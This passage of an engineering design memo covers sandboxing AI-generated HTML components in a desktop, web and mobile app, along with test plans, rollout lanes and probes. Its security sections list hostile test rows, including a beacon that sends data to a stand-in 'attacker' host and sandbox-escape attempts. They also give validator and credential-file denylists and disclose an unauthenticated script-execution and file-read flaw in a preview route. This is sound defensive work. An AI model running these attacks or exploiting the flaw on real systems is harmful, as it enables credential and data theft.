| **Relay web** | `<iframe sandbox="allow-scripts" src="data:text/html;base64,…">` (same as UI), HTML fetched as JSON from the relay route. **Never** a relay-served `text/html` URL. **Navigation control (this host has no interception point):** the relay page adds a parent-document CSP `frame-src data:` **as a `<meta http-equiv>` in `mobile/web/index.html`** — a response header does not survive the tunnel (§2.7) — and that policy is the **load-bearing** control: the embedding document's `frame-src` governs navigations of an already-loaded child frame (script-, `meta refresh`- and embedder-initiated alike) and blocks them **before the request is issued** (measured on Chrome 155; w3c/webappsec-csp#509). The host also counts the frame's `load` events — the **second** `load` is a hostile navigation **or a blocked attempt** (measured: a blocked navigation fires a second `load` too) — so it tears the frame down and renders the frame-level `Couldn't render this graphic` line (§2.8), one debug line; the teardown is the belt, the CSP is the control (round-1 R1/S-R1; round-2 S-R2-1). | The relay has no CSP meta (`mobile/web/index.html`, verified: no CSP, no existing frames), so srcdoc would also work there. One delivery for both web hosts is chosen to keep the code path and the security probe single. An opaque origin sends `Origin: null`, which fails `cross_origin_mutation` (`daemon.py:4188-4205` *(scout)*) and the gateway's origin check (`gateway.py:583-595` *(scout)*). Tunnel header stripping is irrelevant because every policy rides in-document (§2.7). |
| **Native** | `react-native-webview` with `source={{html, baseUrl:"about:blank"}}`, `originWhitelist={["about:*"]}` (P4), `javaScriptEnabled`, `incognito`, `sharedCookiesEnabled={false}`, `thirdPartyCookiesEnabled={false}`, `allowFileAccess={false}`, `allowUniversalAccessFromFileURLs={false}`, `setSupportMultipleWindows={false}`, `onShouldStartLoadWithRequest` → **one-shot**: allow exactly the first request, deny everything after (not URL-matched — see below), `onOpenWindow` deny, **no `injectedJavaScript`**. Theme is pushed with `postMessage(JSON)`. The prelude listens on both `window` and `document` `message` events (an Android quirk), and its outbound calls use `window.ReactNativeWebView.postMessage` when present. | There is no WebView today (`package.json:36-69` *(scout)*). The tunnel credential is set per-fetch by the app (`profile.ts:257-297` *(scout)*), so an incognito WebView holds no credential. Whether it shares the platform cookie jar on the custom route is probe P5; `incognito` + `sharedCookiesEnabled=false` is the belt either way. |
| **TUI** | HTML is never rendered. Image components only (none generated in v1, §8). | — |

**Electron main-window hardening (UI lane, required before the UI frame ships):**
- add `webContents.on("will-frame-navigate")` on the main window with a **stateful one-shot**
  rule: allow exactly the FIRST subframe navigation per frame element — byte-for-byte against
  the `data:` URL the host itself put in `src`, armed at mount and disarmed after — and
  `preventDefault()` every later navigation regardless of URL. No `about:blank`/`about:srcdoc`
  allow, no fragment/nonce match (a component can read `location.href` and re-navigate to a
  `data:` URL carrying the same fragment; round-1 S-R4);
- supplement frames mount in their own partition (`webPreferences.partition = "supplements"`;
  no preload, no cache) with a **deny-by-default** `setPermissionRequestHandler` /
  `setPermissionCheckHandler` — the main window's session installs none today and Electron
  approves all permission requests by default; S11 asserts the handler's answer for each API
  (round-1 S-R10);
- there is no `will-navigate`/`will-frame-navigate` on the main window today (UI
  `src/main/index.ts`, verified by grep; only `browser/index.ts:980,1150` *(scout)*);
- `setWindowOpenHandler` already denies non-auth popups — and hands the URL to the OS;
  tighten it: deny any request whose `frame` is not the main frame, and allow only `http(s)`
  to reach `shell.openExternal` (round-1 S-R11). This memo's sentence elsewhere — "denies
  the popup and hands http(s) to the OS" — is the shape: never the URL as-is.

**`HtmlPreview` is out of scope but is the same class of risk — and now sharpened (round-1 S-R3).**
The canvas preview uses `sandbox="allow-scripts allow-same-origin allow-forms"`
(UI `html-preview.tsx:105-107`, verified) on a `/v1/static/html?path=` document served from
the backend origin (`server/routes/static.py:264-310`). The route is **unauthenticated**: it
sits in neither the managed boundary's sensitive prefixes (`/v1/auth/`, `/v1/settings`,
`/v1/mcp`, `/v1/desktop/`) nor the legacy gate (`server/app.py:588` `_LEGACY_GATED_PREFIXES`,
boundary `:697-712`), it `expanduser().resolve()`s the caller's `path` and gates only on an
HTML mime family — i.e. **unauthenticated same-origin script execution with arbitrary-path
reads**, reachable from any page the operator visits while the daemon is up (the CORS
middleware echoes origins until the desktop allow-list installs), with `allow-forms`
gratuitous on a preview. Fix: drop `allow-same-origin`/`allow-forms` (keep opaque, like the
supplement frame), gate the route behind the desktop bearer and an allow-root, keep
`nosniff`. This memo does **not** fix it: it is a **separate security finding**, and it
should land as its own UI PR **immediately — this week** (§8 F6). The supplements escape
round adds one row mounting the *preview* sandbox with the S1-S11 set, because it is the
closest existing analogue.

### 4.2 Host-side validation (defence in depth, not the boundary)

The sandbox is the boundary. Validation exists to fail fast, reduce noise, and keep honesty
checkable. `supplements/validate.py` rejects a component if:
- it is not well-formed (`html.parser`, stdlib);
- it is > 48 KB;
- it contains any of: `<iframe|object|embed|base|link|meta|form|frame|portal>`,
  `javascript:`, `srcdoc`, `http(s)://` anywhere, `fetch(`, `XMLHttpRequest`, `WebSocket`,
  `EventSource`, `import(`, `importScripts`, `eval(`, `Function(`, `document.cookie`,
  `localStorage`, `sessionStorage`, `indexedDB`, `navigator.sendBeacon`, `window.open`,
  `top.`, `parent.` (only the prelude talks to `parent`), `location`;
- it contains any of the WebRTC/worker-shaped strings named in round-1 review S-R9 —
  `RTCPeerConnection`, `RTCDataChannel`, `WebTransport`, `SharedWorker`, `BroadcastChannel`,
  `new Worker` — so the scan's coverage matches S11's consequences;
- its `<data>` fails the provenance check (§2.10).

A string scan can be evaded by obfuscation. That is accepted, because nothing it guards is
reachable anyway under the sandbox and CSP. The security round (§4.4) attacks the sandbox,
not the scanner.

**Liveness controls (round-1 S-R12).** Two host-side rules keep a hostile frame from
flooding or hanging the reader: the host accepts at most **one `resize`/`error` per frame
per animation frame — latest-wins, the rest dropped** (the prelude already rAF-coalesces
its own posts), and a **watchdog** armed at mount unmounts a frame that never posts `ready`,
or that fails to answer a ping within 5 s, into §2.8's **frame-level** fallback line — it never
rewrites a settled row (round-2 R2-4). The ping is `{t:"ping"}` → `{t:"pong"}` on the §4.1
message wire, one outstanding at a time, never coalesced away (round-2 S-R2-5).

### 4.3 The sensitive denylist (server-side, before the decision)

There is **one predicate, `supplements/denylist.py::is_sensitive(path) -> str`**, applied in
the pre-filter (§2.3) before a path enters the candidate list. Nothing denied is ever sent to
a vendor, journaled, listed, previewed, or served by the file route (which re-checks). It
composes the two existing lists instead of inventing a third:
- `references.py:286-296`: `SENSITIVE_NAMES` (`.env .netrc .npmrc .pypirc credentials id_rsa
  id_ed25519`), `SENSITIVE_SUFFIXES` (`.pem .key .p12 .pfx .keystore .env`),
  `SENSITIVE_NAME_PREFIXES` (`.env`), `SENSITIVE_DIR_PARTS` (`.ssh .gnupg .credentials .aws
  .kube`), compared case-folded (`_sensitive_name`, `references.py:312-343`; APFS case
  rationale there);
- `browser_files.py:480-512`: `CREDENTIAL_NAME_PATTERNS` (adds `id_ecdsa*`, `.git-credentials`,
  `.pgpass`, `.my.cnf`, `.dockercfg`, `credentials.json`, `service-account*.json`,
  `*.keychain*`, `*.jks`) and `CREDENTIAL_COMPONENTS` (adds `.azure`, `keychains`, `secrets`);
- **plus**, for this feature, all computed from live accessors (never a literal): everything
  under `paths.config_dir()` (`paths.py:30,60` — a relocated `LOCAL_OPERATOR_CONFIG_DIR` must
  be safe; it holds the secret store, `secrets/{store.db,master.key,audit.log}`,
  `secrets/keys.py:67-90`) and the scratchpad root (`SCRATCHPAD_ENV`,
  `tools/search_guard.py:214`); `*.sqlite`/`*.db`; `*token*`/`*secret*` basenames;
  `docker-compose*.y*ml` (the operator's standing rule: some repos keep env vars there);
  **and the credential classes the two composed lists miss** (round-1 S-R7):
  `.config/gh` + `hosts.yml` **only** under it, `.docker` component and `config.json`
  **only** under `.docker`, `.config/gcloud` + `application_default_credentials.json` and
  `*_credentials.json`, `.terraform.d` + `*.tfrc.json`, `~/.terraformrc`,
  `~/.config/rclone/rclone.conf`, `~/.s3cfg`, `~/.htpasswd`, `.netrc`/`_netrc`, the
  aws/azure SSO caches (`~/.aws/sso/`, `~/.azure/`), and the browser cookie/credential
  stores (the `keychains`/`secrets` components plus each platform's cookie store, at
  implementation time).
- **The S14 fixture is a table, not a sentence** (round-1 S-R7): for each name —
  `.env.local`, `id_ed25519.pub`, `~/.aws/credentials`, `secrets/x.json`, `PROD.ENV`,
  `.config/gh/hosts.yml`, `.docker/config.json`, `application_default_credentials.json`, a
  symlink `report.md → ~/.ssh/id_rsa` — the expected `is_sensitive()` result **and the rule
  id that produced it**; a denylist gap is only visible at the data. The table also carries the
  **relocated-config-dir case** (round-2 S-R2-4): a case that sets `LOCAL_OPERATOR_CONFIG_DIR`
  to a temp dir and asserts **nothing under it is ever listed or sent** — the direct test of
  "every root computed from live accessors, never a literal", because a hard-coded
  `~/.local-operator` passes every non-relocated fixture and still leaks the secret store
  under a relocation.

The predicate is evaluated on the **resolved** path (symlinks followed) **and** on the path
as written. Either matching denies.

### 4.4 Independent security round — the attack matrix

The security round is a dedicated reviewer subagent, separate from code review, that runs
**live** against a build of each surface. Each row is an actual attempt with a captured
result. Rows marked "blocked" must show blocked; the egress, denylist and route rows assert
what actually leaves or is served.

| # | Attack | Surfaces |
|---|---|---|
| S1 | `parent.api.readFile("/etc/hosts")`, `parent.electron`, `top.api` | UI |
| S2 | `fetch("http://127.0.0.1:1111/v1/desktop/sessions")` / `:8080` / relay `/api/sessions` | UI, relay, native |
| S3 | `fetch("/api/sessions/<id>/command",{method:"POST",…})` (same-origin attempt) | relay |
| S4 | `new Image().src="https://attacker/?d="+data`; CSS `background:url(https://…)`; `@import`; `<link rel=prefetch>`; DNS-prefetch | all |
| S5 | `location="https://…"` — the frame navigating **itself**: Electron/native block it at the one-shot guard (`will-frame-navigate` / `onShouldStartLoadWithRequest`); on relay the **parent document's `frame-src data:`** blocks it **before the request is issued** and reports to the parent, with the second-`load` teardown as the belt (measured on Chrome 155; the relay's WebKit/other browsers are still open — the row names the engine verified, and probe P10 closes the matrix). `<meta refresh>` is self-directed (there is no "to-top" form) and takes the **same** control as `location=`; `top.location=…` and `<a target=_top>` clicks navigate *another* context, so the sandbox flags stop them. `data:`→`data:` self-navigation is the one class the policy allows: the hop inherits the previous document's policy container, so its subresource beacon is blocked too (measured) — a beacon that left during the hop's parse would not be, which is why the teardown stays (round-1 R1/S-R1; round-2 S-R2-1/S-R2-2) | all |
| S6 | `window.open`, `<a target=_blank>`, `form.submit()` | all |
| S7 | Remove the sandbox: `frameElement.removeAttribute("sandbox")`, nested `<iframe srcdoc>` with `allow-same-origin` | UI, relay |
| S8 | Forged host message: the frame posts `{lo:"supplement-host",…}` to itself / to parent with a huge `h`, NaN, negative; a **state-moving message without (or with a stale) nonce is dropped** (S-R4); message flood (10k/s) | all |
| S9 | Theme vars injection: `vars:{"--lo-x":"red;}</style><script>"}` (host side is trusted, but verify the prelude's whitelist) | all |
| S10 | `document.cookie`, `localStorage`, `indexedDB`, `caches` | all |
| S11 | `navigator.clipboard`, `requestFullscreen`, `alert/confirm/prompt`, `print()`, download via `a[download]` | all |
| S12 | CPU/memory DoS: `while(1){}`, 1 GB allocation, and a 10k messages/s flood with **no `{t:"pong"}` answer** to the host's `{t:"ping"}` (§4.1's wire) → host stays responsive via per-frame coalescing + the 5 s watchdog (§4.2); the Chromium OOPIF for an opaque-origin frame is probe P6 | UI, relay |
| S13 | Native: `onShouldStartLoadWithRequest` bypass via `window.location`, `about:blank` re-navigation, `intent://`, `file:///` — all denied by the one-shot rule; **plus: re-navigate to a `data:` URL that copies the host's fragment, then post `{t:"error"}` → no host state changes** (S-R4) | native |
| S14 | Denylist, as the **table fixture** of §4.3 (each name + expected `is_sensitive()` + rule id, **including the relocated-`LOCAL_OPERATOR_CONFIG_DIR` case**); then a turn that writes them → none listed, none sent to the vendor (inspect the decision request body) | core |
| S15 | File route: `/supplements/<job>/file?i=<out of range>`, `?i=-1`, digest of another session, path traversal in the job id; plus a `.txt` whose body begins `<!doctype html><script>…` → rendered as text, non-scriptable `Content-Type` + `nosniff` (S-R6) | relay |
| S16 | Generated text containing a fake credential shape → `scrub_shapes` masks it in evidence | core |
| S17 | Decision egress: a turn with a deliverable under `~/clients/<name>/…`; inspect the decision request body — basenames, sizes, writing tools, answer text only: no directories, no file contents, no tool output (round-1 S-R8) | core |

---

## 5. Evidence plan

### 5.1 Unit and contract tests (core)

- **Trigger matrix** (§2.2): one test per row of the case table, built on `_note_run_input`
  plus the provenance freeze. Includes "catch-up wake + user = eligible" and "user + courtesy
  wake = not eligible". Includes the R2 case: **a compacted, length-truncated turn that
auto-continued** pre-filters over the accumulated logical-turn messages — the
  pre-compaction tool results and file writes stay in input (assert against `RunProvenance`,
  never the held end).
- **Prelude label layout (round-2 D2-1/D2-2/D2-4):** on identical data, a unit-swap pair
  (`req/s` vs `ms`) asserts every axis label's painted box stays inside the frame — the composed
  top-tick label included — at 620, 320 and 220 px; and that a category label is truncated only
  when its slot cannot hold it, with the 300/220 px collision fixture (the forced last label
  dropped rather than overlapped). Unit test on the built prelude (App. C), plus the rendered
  pair in the QA matrix (§5.4).
- **Wire liveness (round-2 S-R2-5):** the frame answers `{t:"ping"}` with `{t:"pong"}`, and a
  frame that does not is unmounted by the 5 s watchdog into the **frame-level** fallback line
  (§4.2) — never a rewrite of the settled row.
- **Exec unchanged:** `lop exec` text and `--json` golden output byte-identical before/after
  on a turn that *would* qualify (scripted provider). No `supplement_progress` line on
  `--json`.
- **Model context parity:** a session with `supplement_v1` rows → `build_llm_history()` and
  the rendered provider request are byte-identical to the same session without them. The
  compaction cut is unaffected.
- **Fail-open:** the decision raising/timeout/no-vendor; the generator raising at each
  stage; the attachment store returning `None`. Each yields a terminal row or no row, never
  a turn error, and never delays `agent_end`/attention publish (assert ordering by event
  sequence, not by clock: `AGENTS.md` "Wait on the event, never on the clock").
- **Supersede and cancel:** a new turn cancels the running job, and the row reads `cancelled`
  `superseded`. Dispose cancels it. `is_busy()` is False with a job running.
  `is_conversationally_active()` is unaffected.
- **Sync:** `referenced_attachments_in` finds component digests in a journal with a
  `supplement_v1` row.
- **Denylist:** the §4.4 S14 table as unit cases (name → expected result → rule id).
- **`LO.fmt` mirror (round-1 D4):** the Python mirror matches the prelude's pinned vectors —
  source-precision default; an explicit `digits` is the only rounding path.
- **Host text (round-1 S-R2):** `display_text()` strips C0/C1 from names/titles/captions on
  every surface; an OSC 8 link built from a name containing ESC/BEL/newline carries no
  controls beyond the renderer's own.
- **Settings:** `_consumer_defaults` entries; `test_every_default_matches_its_consumer`.
- **Validator + honesty:** fabricated numbers rejected; derived columns accepted only when
  recomputable; **rendered values** — the fmt-mirror check rejects a baked-in rounded string
  (D4).

### 5.2 Golden set, spam rate and acceptance

**Golden set** `tests/fixtures/supplements/golden/`: 60 recorded turns (user message, final
answer, run messages with tool results, a file tree snapshot), labelled by the operator or
designer as `expect_files: [...]`, `expect_graphics: yes|no`.

| Class | n | Expected |
|---|---|---|
| Pure Q&A, no tools | 10 | nothing (pre-filter must stop all 10 without a call) |
| Short answers / acknowledgements ("done", "merged #123") | 8 | nothing |
| Code edits in a repo (edits to source files) | 8 | nothing — source edits are not deliverables (see note) |
| Wrote a report / export / doc deliverable | 8 | files yes, graphics no |
| Benchmark / analytics with tabular numbers | 8 | graphics yes (+ files if written) |
| Numbers present but no figure helps (one or two values, a version string) | 6 | graphics no |
| Data the answer *talks about* but no evidence rows (hallucination bait) | 6 | graphics no |
| Scratch-only writes (`/tmp`, scratchpad, logs) | 3 | nothing |
| Secret-adjacent writes (`.env`, keys) | 3 | nothing |

Note on code edits: a code-edit turn's "deliverable" is the diff, which every surface already
shows as tool rows. Featuring `foo.py` would be spam. The decision's file rubric says so
explicitly. A one-line opt-in for "files I edited" is not in v1.

**Metrics:**
- **Spam rate** = (turns where something was shown and the label says nothing should be) /
  (all turns). Acceptance: **≤ 3 %** on the golden set, and on the dogfood week (below)
  **≤ 5 % of eligible turns** measured as `dismissed / shown`.
- **Graphics precision** = correct-yes / all-yes ≥ **0.9**. **Graphics recall** ≥ 0.6 (precision
  over recall, stated).
- **File precision** ≥ 0.85; featured-set exact-match ≥ 0.7.
- **Pre-filter absorption**: the share of all golden turns with no vendor call. Target ≥ 60 %;
  the measured fleet figure is probe P8.
- **Honesty**: 0 fabricated values across all generated components (§2.10 QA spot-check).
- **Latency**: p50 decision ≤ 1.5 s after `agent_end`; p90 job ≤ 45 s; `agent_end` →
  attention publish delta unchanged vs. baseline (±5 ms).

**Dogfood week (before default-on ships to the fleet):**
- run with `supplements.enabled=true` on the operator's machine;
- read `dismissed`, Retry and `adjust` counts from the rows;
- read cost from `/usage` `by_purpose`;
- read pre-filter absorption from a DEBUG counter line per turn.

### 5.3 Cost and quality measurement plan

- **Decision arms:** Radient → TypeSafe → OpenRouter cascade (as shipped) vs. a warm-prefix
  session-model fork (ask-gate shape, measured on deepseek-flash and Sonnet). Metrics: the
  golden file and graphics precision/recall, $/eligible turn, p50/p90 latency.
- **Generator arms:** run on the 8 graphics-positive goldens (§5.2) × 3 renders each:
  - Sonnet-class;
  - GPT mid-class;
  - Gemini Pro-class;
  - deepseek-flash (session-model fallback);
  - the prelude ON vs. OFF on the best model.
- **Metrics:**
  - validator pass rate at turn 1 and turn 2;
  - output tokens/component;
  - $/job;
  - a designer score (1-5) on a fixed rubric = Appendix A's guidelines, scored blind from
    rendered frames in 2 light + 2 dark themes;
  - honesty mismatches.
- **Expected envelope (to be confirmed by the plan, not asserted):**
  - decision ≈ $0.0001/eligible turn (the classification layer's documented range);
  - generator ≈ 9-15k input + 1-2.5k output tokens/job, so at Sonnet-class list prices
    ≈ $0.04-0.08/job.
  - This is why `maxCostUsd` defaults to **0.20** — 2 × the $0.08 high end of the per-job
    envelope plus $0.04 of headroom, both figures per job (round-1 R3; round-2 R2-6) — and the
    open question Q1 exists.

### 5.4 QA matrix (qa-tester, per lane, real app)

QA uses an isolated config dir and synthetic ids, and every inherited `CMUX_*` is unset
(team brief).

| Surface | Cases |
|---|---|
| Core/TUI | the trigger table end-to-end through a real runtime (`lop` with a scripted provider); exec `--json` and text unchanged (diff vs main); kill switch; settings off; cancel/steer/restart via slash commands; dispose mid-job; next-turn-during-job timing (event order); reaper exit mid-job; file links click-open; HTML silently absent; rendered SVG frames of the row in 3 states |
| UI | the live job in 6 states; history reload; fold collapsed/expanded; 4 themes + a live switch mid-render (frames before/after); resize 320/600/900 px **and a live drag 900→320; canvas-open→close (the 220 px floor)**; files → canvas / reveal / OS app; mesh-session row ("on <peer>" disabled preview); the S-matrix subset |
| Relay web | the same states on a phone viewport; tunnel path; ended-session history shows components (the route does not 404 like `_entry_for_session`) |
| Native | an iOS sim + Android emulator CI build; old-build compatibility (an unnegotiated viewer sees **no** row); condensing still collapses the turn |

Visual evidence is required for every UI-bearing lane (AGENTS.md "Visual validation"). That
means before/after frames, the brand themes plus 2 others, and a frame mid-theme-switch.

**Added captures (round-1 design D9), per UI-bearing lane, in addition to the matrix above:**
- loading (the reserved box, title as its label); empty (a done row renders nothing; files-only
  reserves no frame space); error (the frame-level fallback line + the failed line); supersede
  (the line disappears; no Retry);
- populated extremes: 4 files + "N more" collapsed and expanded; 3 frames against the
  `min(480px, 40vh)` budget; a ≥ 12-row table with the 320 px horizontal scroll; long paths
  and long captions;
- light/dark at the measured extremes (localOperatorLight + kanagawaLotus;
  localOperatorDark + everforest) plus a frame mid-theme-switch — and an "OS preference
  opposite the app theme" case per surface (round-1 D8);
- narrow: 320 px and the 220 px canvas-open column, with a live drag (per D3); the label
  fixtures (D2-1/D2-2) — a long-unit chart (`150 req/s` on the top tick, which clipped at every
  width before the round-2 fix) and the six-long-category collision fixture at 300 and 220 px;
  reduced motion /
  no shimmer; the mesh row ("on <peer>", preview disabled); TUI copy parity (same fixed
  strings, no hover affordances; files-only shows no reserved gap);
- each series' values readable without hover, on a touch surface (round-1 D14).

---

## 6. Lane decomposition

**The frozen contract** that lets lanes run in parallel is this memo's §2.4 row schema
(and its stale-row reader rule), §2.7 event, ops, routes and capability strings, and §2.6
document/`postMessage` contract. Lane C0 lands them **first, as code**:
- the `SupplementProgressEvent` class;
- the `supplement_v1` details TypedDict;
- the route stubs answering 404;
- the capability strings;
- JSON fixtures in `tests/fixtures/supplements/` (rows — including the stale-row fixture
  `state=queued, no live job`, and a superseded row — events, three assembled documents).

Every other lane codes against those fixtures.

| Lane | Repo | Scope | Consumes | Depends on | PR shape | Gates |
|---|---|---|---|---|---|---|
| **C0 contract** | core | event class, row TypedDict, capability strings, fixtures, route stubs, the prelude files + assembler (pure) | — | — | 1 PR, no behaviour | review + QA (fixture round-trip, `/v1/capabilities`) |
| **C1 core engine** | core | §3.1 rows 1-14, 17, 22-23: provenance (incl. logical-turn accumulation, R2), trigger, runner, pre-filter, decision, generator, validator, persistence, ops, config, kill switch | C0 | C0 | 1 PR (large; split into C1a decision+files and C1b generator if > ~1.5k LOC) | review + QA (trigger matrix, exec diff, timing order) + **security round S2/S10/S13-S17** |
| **C2 routes** | core | desktop document route (§3.1 row 15), relay document + file routes and ops (rows 19-20), mobile projection (row 18) | C0 | C0 | 1 PR | review + QA (curl matrix incl. unauthorised, wrong-session, unreferenced digest, denylisted file, ended session) + security S5/S8/S9/S11/S13 |
| **T TUI** | core | §3.2 | C0 (+ C1 for live QA) | C0 | 1 PR | review + QA + **design** (SVG frames) |
| **R relay web** | core (`mobile/web`) | §3.1 row 21: frame, theme push, files list, indicator | C0, C2 | C0 | 1 PR | review + QA + design + UX (cancel/steer/retry flow) + **security S1-S12 on relay** |
| **U UI** | local-operator-ui | §3.3 | C0 fixtures | C0 merged (fixtures) | 2 PRs: **U-a** main-window hardening (U6 one-shot guard, permission handlers, popup scheme gate) — ships first and alone; **U-b** row, frame, indicator, files, settings | review + QA + design + UX + **security S1-S12 on Electron** (U-a gets its own security round) |
| **N native** | local-operator-mobile | §3.4 | C0, C2 | C2 merged (routes) | 1 PR + dependency note | review + QA (CI builds, sim/emulator) + design + UX + **security S1-S12 on WebView** |
| **D docs** | core | `guides/highlights/GUIDE.md` (≤ 80 lines: what it is, on/off, cost, privacy, troubleshooting), `docs/DESKTOP_API.md` + mobile wire doc entries | C0 | C1 | 1 PR | review |
| **Radient** | — | **none in v1** (§2.3) | — | — | — | — |

**Parallelism.**
- After C0 merges: C1, C2, T, U-a, U-b, R run in parallel.
- N waits for C2, because it needs real routes for device QA.
- D trails C1.
- **The release order is enforced by capability negotiation, not by timing.** The runtime
  emits `supplement_progress` and projects `supplement` entries only to viewers that
  negotiated `supplements-v1` — the owner-record string ANDed with the viewer's own
  auth-frame boolean (desktop live path: the route query param; §2.7) — so an older UI or
  native build never sees an unknown kind. The scout found that old native builds would
  otherwise paint unknown kinds visibly.
- **Default-on is flipped in C1, but no viewer shows anything until its own lane ships.**
  - Files cost nothing.
  - Graphics spend money before any UI can render them. C1 therefore **keeps
    `supplements.graphics` off by default until U-b or R has shipped**.
  - The flip is a one-line follow-up PR in the release window that carries the first
    renderer.

**The security round (S-matrix, §4.4)** is an *independent* reviewer pass per surface
(a `reviewer` subagent with the security brief, not the implementing coder). Each surface's
results are posted as `### Security review — round <N>` with `S`-prefixed findings and
reproductions. A UI or native lane **cannot merge** with any S-finding open at blocker/major.

---

## 7. Risks and watch items

- **CSP inheritance on Electron (P1).** The spec basis is contested — fetch's "is local"
  includes `data:`, while Chromium has drifted by navigation method. P1's acceptance is:
  **the initial document loads AND the CSP is enforced**; if it fails, the fallback is
  option 2 (the custom protocol, §4.1) — about one more main-process PR. The detector is
  the U-b QA frame plus the `ready` message never arriving (the host logs it); P1 records
  `isSecureContext` and `typeof RTCPeerConnection` for the winner.
- **Self-navigation (R1/S-R1; dispatch corrected in round 2).** A sandboxed frame can navigate
  itself; every surface ships its navigation control before frames mount — Electron/native:
  one-shot guards; relay: the parent page's `frame-src data:` **meta** (it blocks the navigation
  before the request is issued; measured, §4.1) with the second-`load` teardown as the belt. The
  frame's *own* CSP does not constrain its own navigation, so a reader who takes that sentence
  for the embedding policy's too deletes the relay's only pre-request control. A failure here is
  a security hold, not a QA nit.
- **Prelude size budget.** The build is 4,538 B gzip against the re-stated ≤ 4.5 KB cap (70 B
  spare) and 10,224 B raw against ≤ 11 KB (1,040 B spare); caps, method and why they moved are
  in §2.6. Any addition must re-measure and, at this margin, trim: the App. B accent guard is
  **+412 B gzip measured on that same method** (the spike's `measure.py`), so it is still
  deliberately not in v1. This is the round-2 residue with the widest blast radius — the cap
  move is a design decision the reviewer should confirm, not a coder's convenience.
- **Accent adjacency (D11).** Supplement frames do not share a rendered view with the app's
  accent-drawn charts in v1 (the chart idiom is used in settings, the projects timeline and
  the analytics dialog, which presents *over* chat; none renders beside the transcript). If
  a surface ever shows both, guard slot 1 (App. B; measured at **+412 B gzip** with §2.6's one
  method — the spike's `measure.py` — so it lands
  with that surface, under the size test).
- **Spam drift.** Decision quality is model judgment. Watch `dismissed/shown` and Retry
  counts weekly for the first month. `GRAPHICS_THRESHOLD`/`FILE_PROB_FLOOR` are policy
  constants: tune once, from data.
- **Cost surprise.** Default-on graphics on a busy fleet. The guards are `maxCostUsd`, the
  pre-filter, the `noul` threshold, the per-runtime one-job rule, and `/usage` visibility.
  Watch `by_purpose["supplement_render"]` per day.
- **Honesty validator false-rejects** (unit conversion, rounding in the source). Accept a
  lower pass rate rather than loosen the rule; watch turn-2 repair frequency.
- **A late row on a compacted or moved session.** The anchor id survives compaction (custom
  entries are untouched by the cut) and moves (blobs follow the `attachment` key). A
  remote-hosted session shows files as "on <peer>" until F2.
- **Event-order regressions.** C1 must not move `agent_end`/attention publish. A timing
  assertion in QA is required: the `agent_end` → `attention publish` delta is unchanged.
- **The reaper cutting jobs.** By design. If dogfood shows many `cancelled` rows from
  reaper exits (`error="disposed"`), consider counting the job in `may_refresh` only (never
  in `is_busy`), bounded by `timeoutS`.
- **WebView dependency on native.** It adds binary size and a native module. If the native
  team rejects it, native ships files-only (still useful) and graphics follow later.
- **Theme flash on load.** The prelude hides until the theme arrives (400 ms cap). Design
  checks frames at t=0/100/500 ms.
- **The prompt or helpers drifting from the prelude.** The prompt names exact helper
  signatures. A unit test parses Appendix A's helper list and Appendix C's `LO` key list
  (incl. `LO.ds`/`LO.col`) against `prelude.js`'s `LO` keys.

---

## 8. Out of scope / follow-ups (explicit)

1. **F1 — image components.** The generator emits HTML only in v1; the TUI therefore shows
   files only (images need a raster component, which needs a renderer). A later option is a
   server-side SVG→PNG for simple charts, for the TUI's image path.
2. **F2 — mesh preview/transfer.** v1 shows peer-hosted files and components as "on <peer>"
   with preview disabled (the desktop already returns 409 `attachment_on_peer`,
   `server/utils/desktop_sessions.py:4791-4819` *(scout)*). The follow-up is a peer
   blob-fetch op over the mesh relay, reusing move/sync's digest scan.
3. **F3 — `decide_many`** in `ClassificationService` (one request, two questions). It is
   client-local and needs no Radient change.
4. **F4 — "files I edited" opt-in** for code turns.
5. **F5 — native share/open** (`expo-sharing`, a new dependency).
6. **F6 — `HtmlPreview` sandbox.** Confirmed and sharpened (round-1 S-R3): `allow-scripts` +
   `allow-[redacted]` + `allow-forms` on an **unauthenticated** backend route
   (`/v1/static/html`, outside both the sensitive-prefix boundary and the legacy gate) — i.e.
   [redacted] script execution with arbitrary-path reads. **Land it as its own UI PR
   immediately — this week**; it must not wait on supplements.
7. **F7 — UI palette contract `series-1..6`** if other UI surfaces want the series palette.
   v1 keeps it prelude-owned.
8. **F8 — a server-side headless render check** of generated components (a render probe
   feeding errors into turn 2). Not in v1, because it would need a browser engine in the
   runtime.
9. Unifying the UI's `mentioned-files.ts` with core `supplements/candidates.py`.

---

## 9. Named probes (each settles one uncertainty; owner lane in brackets)

| ID | Question | How to settle it | Lane |
|---|---|---|---|
| P1 | Does an Electron 44 `data:` iframe (sandbox `allow-scripts`) load with **the initial document loading AND the CSP enforced** — versus inheriting the renderer's `script-src 'self'`? Same question for `blob:`. | A Storybook/`app:headless` story mounting both frames, with an inline script posting `ready`. Record which posts arrive, and **record `window.isSecureContext` and `typeof RTCPeerConnection` in the result whatever the outcome** — those decide whether the option-2 fallback is a downgrade. | U-b (before frame code) |
| P2 | Do opaque-origin subresource GETs carry the `SameSite=Lax` `lop_mobile` cookie? | A relay-web probe page plus devtools network log (expected: no) | R (security S5) |
| P3 | Does react-native-webview's `onShouldStartLoadWithRequest` see the initial `html` load on iOS/Android, and does `baseUrl:"about:blank"` produce an opaque origin? | sim + emulator probe component | N |
| P4 | Is `originWhitelist={["about:*"]}` sufficient for `source.html`? The upstream docs say `['*']` is required; if it is, the whitelist cannot be the control (a non-whitelisted URL is *handed to the OS*) — rely on the one-shot `onShouldStartLoadWithRequest` deny instead. | the same probe | N |
| P5 | Can `TranscriptEntry` grow `kind:"supplement"` with per-viewer negotiation in the projection, given projections are one snapshot per session? | read `mobile/daemon.py` frame fan-out; if per-viewer projection is impossible, carry supplements in a sibling `supplements: {anchor: row}` map that old clients ignore (dataclass field, loose JSON) | C2 |
| P6 | Does Chromium isolate an opaque-origin sandboxed frame into its own process in Electron 44 (so `while(1)` does not freeze the renderer)? **Record the frame's `load` count too** — the relay teardown rule (S-R1) counts load events. | S12 probe | U-b |
| P7 | Which `tui/app.py` handler receives unknown `AgentEvent` types, and where does an answer block expose its anchor for live mounting? | read `on_assistant_message_end` (`tui/app.py:53879`) and the event dispatch (file is over grep's cap; use `sed` ranges) | T |
| P8 | The pre-filter absorption rate on real sessions | run `supplements/candidates.py` offline over the last 500 eligible turns in the operator's journals (read-only) | C1 |
| P9 | Cost of the relay route's "digest referenced by this session" check on large journals | time a byte `rfind` scan on a 260 MB journal, the transcript reader's own measurement pattern (`transcript.py:1075-1120`) | C2 |
